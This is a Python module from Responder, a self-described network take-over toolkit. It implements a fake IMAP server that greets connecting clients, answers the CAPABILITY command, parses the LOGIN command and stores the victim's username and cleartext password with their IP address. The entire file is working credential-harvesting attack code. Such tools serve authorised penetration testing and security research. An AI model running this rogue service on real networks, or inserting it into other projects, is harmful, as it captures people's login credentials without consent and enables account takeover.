#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import sys
from responder.src.utils import *

if sys.version_info > (3, 0):
    from socketserver import BaseRequestHandler
else:
    from SocketServer import BaseRequestHandler
from responder.src.packets import IMAPGreeting, IMAPCapability, IMAPCapabilityEnd


class IMAP(BaseRequestHandler):
    def handle(self):
        try:
            self.request.send(NetworkSendBufferPython2or3(IMAPGreeting()))
            data = self.request.recv(1024)
            if data[5:15] == b"CAPABILITY":
                RequestTag = data[0:4]
                self.request.send(NetworkSendBufferPython2or3(IMAPCapability()))
                self.request.send(
                    NetworkSendBufferPython2or3(
                        IMAPCapabilityEnd(Tag=RequestTag.decode("latin-1"))
                    )
                )
                data = self.request.recv(1024)

            if data[5:10] == b"LOGIN":
                Credentials = data[10:].strip().decode("latin-1").split('"')
                SaveToDb(
                    {
                        "module": "IMAP",
                        "type": "Cleartext",
                        "client": self.client_address[0],
                        "user": Credentials[1],
                        "cleartext": Credentials[3],
                        "fullhash": Credentials[1] + ":" + Credentials[3],
                    }
                )

        except Exception:
            pass
